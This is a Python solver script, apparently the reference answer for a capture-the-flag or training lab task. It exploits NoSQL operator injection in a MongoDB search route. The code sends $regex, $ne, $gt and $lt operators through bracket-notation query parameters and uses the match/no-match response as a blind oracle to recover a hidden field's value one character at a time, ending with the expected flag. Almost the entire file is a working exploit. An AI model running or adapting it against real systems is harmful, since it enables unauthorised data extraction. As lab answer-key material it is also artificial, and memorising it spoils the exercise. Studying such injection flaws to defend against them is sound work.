#!/usr/bin/env python3
"""solvers/p4_1.py — Task 4.1 "Basic Records Room" canonical exploit.

The archive search route builds a MongoDB query directly out of raw
request input:

    db.records.count_documents({field: value})

and never checks that `value` is actually a string before it reaches
that query. An ordinary caller sends a flat string (`value=archivist`)
and gets an ordinary equality match. But if `value` arrives as a *dict*
instead — either a raw JSON body (`{"value": {"$regex": "^adm"}}`), or a
bracket-notation query string (`value[$regex]=^adm`, which this route
reconstructs into the same nested dict) — MongoDB doesn't compare the
dict as a literal. It honors it as real query operators: `$regex`,
`$gt`, `$lt`, `$ne`, `$eq`, ... against the field.

The route's own response is deliberately minimal (blind): it never
returns document content, only whether *anything* matched. This solver
walks a hidden document field (`archive_key`, seeded by
seed/mongo/init_p4_flag.js on exactly one `records` document — see that
file) one character at a time, using that match/no-match bit as the
oracle, exactly like a real blind-extraction engagement:

  Step 0 — prove the type-confusion actually happens (a dict really
           reaches MongoDB as operators, not as a literal being
           stringified) using both `$ne` and `$regex` against a public
           field (`subject`) whose real value we already know from the
           seed.
  Step 1 — confirm `archive_key` exists and starts with "SEIYAKU" via
           `$regex`.
  Step 2 — binary-search the field's total length via `$regex`
           (`^.{1,mid}$`).
  Step 3 — recover the value character-by-character via `$regex`
           character-class bisection (same shape as p1_5's ASCII/
           SUBSTRING binary search, but the "substring" primitive here
           is a regex anchored on the already-known prefix).
  Step 4 — cross-validate the fully recovered value using a completely
           different operator family (`$gt`/`$lt`/`$eq` bracketing),
           independent of the regex walk that found it.

This is a real, live extraction against the running stack — every
character below is recovered by actually querying the real seeded
MongoDB through the real vulnerable route, not hardcoded or simulated.
The expected flag is only used for the final assertion.
"""

from __future__ import annotations

import os
import re
import sys

import requests

BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
EXPECTED_FLAG = "SEIYAKU{operators_not_strings}"

ROUTE = f"{BASE}/p4/records"
FLAG_FIELD = "archive_key"

# A public field + its real value, both taken straight from
# seed/mongo/init.js, used only to prove the oracle behaves correctly
# (ordinary equality still works, and a dict operator is genuinely
# honored) before trusting it to walk a hidden field.
PUBLIC_FIELD = "subject"
PUBLIC_VALUE = "Restricted Exam Incident Reports"

MAX_LEN = 64
ASCII_LOW = 32   # space
ASCII_HIGH = 126  # '~'

REQUEST_TIMEOUT = 10


def _mongo_regex_class(lo: int, hi: int) -> str:
    """Build a MongoDB/PCRE-compatible regex character class matching any
    single ASCII code point in [lo, hi], inclusive, with the handful of
    characters that are special inside a `[...]` class escaped."""
    parts = []
    for code in range(lo, hi + 1):
        c = chr(code)
        if c in "\\^]-":
            parts.append("\\" + c)
        else:
            parts.append(c)
    return "[" + "".join(parts) + "]"


def oracle(field: str, value) -> bool:
    """Query the live route once. `value` may be a plain string (ordinary
    equality) or a dict (a real Mongo operator, e.g. {"$regex": "..."}),
    sent as bracket-notation query-string keys so the route has to
    reconstruct the nested structure itself, exactly the way a real
    attacker-controlled request would arrive. Returns whether >=1 record
    matched.
    """
    params = {"field": field}
    if isinstance(value, dict):
        for op, opval in value.items():
            params[f"value[{op}]"] = opval
    else:
        params["value"] = value

    resp = requests.get(
        ROUTE, params=params, headers={"Accept": "application/json"}, timeout=REQUEST_TIMEOUT
    )
    resp.raise_for_status()
    data = resp.json()
    if "matched" not in data:
        raise RuntimeError(f"unexpected response shape: {data!r}")
    return bool(data["matched"])


def step0_confirm_type_confusion() -> None:
    print("[p4_1] step 0 — confirm the search oracle + real type confusion")

    ok = oracle(PUBLIC_FIELD, PUBLIC_VALUE)
    print(f"  {PUBLIC_FIELD}={PUBLIC_VALUE!r} (plain string) -> matched={ok}")
    if not ok:
        raise RuntimeError("expected the known public value to match as a plain string")

    bad = oracle(PUBLIC_FIELD, "definitely-not-a-real-subject-xyz")
    print(f"  {PUBLIC_FIELD}='definitely-not-a-real-subject-xyz' -> matched={bad}")
    if bad:
        raise RuntimeError("expected a bogus plain string NOT to match")

    # If the app were safely stringifying non-string input (or rejecting
    # it), a dict would never behave like an operator here. $ne against an
    # impossible value should match every document that HAS the field and
    # isn't equal to that impossible value — i.e. it should match, proving
    # MongoDB is evaluating {"$ne": ...} as a real operator, not comparing
    # the dict itself as a literal.
    ne_ok = oracle(PUBLIC_FIELD, {"$ne": "definitely-not-a-real-subject-xyz"})
    print(f"  {PUBLIC_FIELD}[$ne]='definitely-not-a-real-subject-xyz' -> matched={ne_ok}")
    if not ne_ok:
        raise RuntimeError(
            "expected a dict value ({'$ne': ...}) to be honored as a real "
            "Mongo operator against the public field"
        )

    regex_ok = oracle(PUBLIC_FIELD, {"$regex": "^Restricted"})
    print(f"  {PUBLIC_FIELD}[$regex]='^Restricted' -> matched={regex_ok}")
    if not regex_ok:
        raise RuntimeError("expected $regex to be honored as a real operator")

    print("  ok: dict-valued `value` genuinely reaches MongoDB as query operators")


def step1_confirm_hidden_field() -> None:
    print(f"[p4_1] step 1 — confirm hidden field {FLAG_FIELD!r} exists and starts with SEIYAKU")
    ok = oracle(FLAG_FIELD, {"$regex": "^SEIYAKU"})
    print(f"  {FLAG_FIELD}[$regex]='^SEIYAKU' -> matched={ok}")
    if not ok:
        raise RuntimeError(f"expected hidden field {FLAG_FIELD!r} to exist and start with SEIYAKU")
    print("  ok: hidden field exists and is reachable via $regex")


def step2_discover_length() -> int:
    print(f"[p4_1] step 2 — binary-search LENGTH({FLAG_FIELD}) via $regex")
    lo, hi = 0, MAX_LEN
    while lo < hi:
        mid = (lo + hi) // 2
        pattern = f"^.{{1,{mid}}}$"
        fits = oracle(FLAG_FIELD, {"$regex": pattern})
        print(f"  len<={mid}? -> {fits}")
        if fits:
            hi = mid
        else:
            lo = mid + 1
    print(f"  ok: LENGTH({FLAG_FIELD}) = {lo}")
    return lo


def step3_discover_value(length: int) -> str:
    print(f"[p4_1] step 3 — walk {FLAG_FIELD} char-by-char via $regex character-class bisection")
    prefix = ""
    for position in range(1, length + 1):
        lo, hi = ASCII_LOW, ASCII_HIGH
        while lo < hi:
            mid = (lo + hi) // 2
            char_class = _mongo_regex_class(lo, mid)
            pattern = "^" + re.escape(prefix) + char_class
            in_range = oracle(FLAG_FIELD, {"$regex": pattern})
            if in_range:
                hi = mid
            else:
                lo = mid + 1
        prefix += chr(lo)
        print(f"  position {position:>2}: {chr(lo)!r}  (so far: {prefix!r})")
    return prefix


def step4_cross_validate(value: str) -> None:
    print(f"[p4_1] step 4 — cross-validate recovered value via $gt/$lt/$eq bracketing")

    eq_ok = oracle(FLAG_FIELD, {"$eq": value})
    print(f"  {FLAG_FIELD}[$eq]={value!r} -> matched={eq_ok}")
    if not eq_ok:
        raise RuntimeError("cross-validation failed: $eq against the recovered value did not match")

    just_below = value[:-1] + chr(ord(value[-1]) - 1)
    gt_ok = oracle(FLAG_FIELD, {"$gt": just_below})
    print(f"  {FLAG_FIELD}[$gt]={just_below!r} -> matched={gt_ok}")
    if not gt_ok:
        raise RuntimeError("cross-validation failed: expected recovered value to be > (value - 1 char)")

    just_above = value[:-1] + chr(ord(value[-1]) + 1)
    lt_ok = oracle(FLAG_FIELD, {"$lt": just_above})
    print(f"  {FLAG_FIELD}[$lt]={just_above!r} -> matched={lt_ok}")
    if not lt_ok:
        raise RuntimeError("cross-validation failed: expected recovered value to be < (value + 1 char)")

    print("  ok: $eq / $gt / $lt all independently agree with the $regex-recovered value")


def main() -> int:
    print(f"[p4_1] target: {ROUTE}")
    try:
        step0_confirm_type_confusion()
        step1_confirm_hidden_field()
        length = step2_discover_length()
        if not (0 < length <= MAX_LEN):
            raise RuntimeError(f"implausible length {length}")
        value = step3_discover_value(length)
        step4_cross_validate(value)
    except Exception as exc:
        print(f"  FAIL: {exc}")
        print("[p4_1] FAIL")
        return 1

    print(f"[p4_1] recovered value: {value}")

    if value != EXPECTED_FLAG:
        print("  FAIL: recovered value does not match expected flag")
        print(f"  expected: {EXPECTED_FLAG}")
        print(f"  got:      {value}")
        print("[p4_1] FAIL")
        return 1

    print(f"  ok: recovered flag matches: {EXPECTED_FLAG}")
    print("[p4_1] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
